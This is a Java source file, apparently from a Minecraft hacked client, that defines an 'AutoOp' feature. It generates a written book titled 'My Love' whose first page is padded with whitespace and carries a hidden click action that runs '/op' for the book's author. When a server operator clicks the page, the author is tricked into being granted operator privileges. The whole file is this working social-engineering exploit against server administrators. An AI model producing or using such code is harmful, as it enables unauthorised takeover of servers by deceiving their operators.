

package vertex.client.feature.items.impl;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import vertex.client.VertexMain;
import vertex.client.feature.items.Item;
import vertex.client.helper.nbt.NbtGroup;
import vertex.client.helper.nbt.NbtList;
import vertex.client.helper.nbt.NbtProperty;

public class AutoOp extends Item {
    public AutoOp() {
        super("AutoOp", "Automatedly Ops yourself");
    }

    @Override
    public ItemStack generate() {
        String author = VertexMain.client.getSession().getProfile().getName();
        String server = VertexMain.client.player.getServer().getServerIp();

        String titleStr = "My Love";
        String contentStr = "Reasons to play on " + server + "\n1: Flip the page";
        String cmdStr = "/op " + author;

        NbtGroup ng = new NbtGroup(new NbtProperty("title", titleStr), new NbtProperty("author", author), new NbtList(
                "pages",
                new NbtProperty("{\"text\": \"" + contentStr + " ".repeat(553) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + cmdStr + "\"}}"),
                new NbtProperty("{\"text\":\"\"}"),
                new NbtProperty("{\"text\":\"\"}")
        ));

        ItemStack s = new ItemStack(Items.WRITTEN_BOOK);
        s.setNbt(ng.toCompound());
        return s;
    }
}
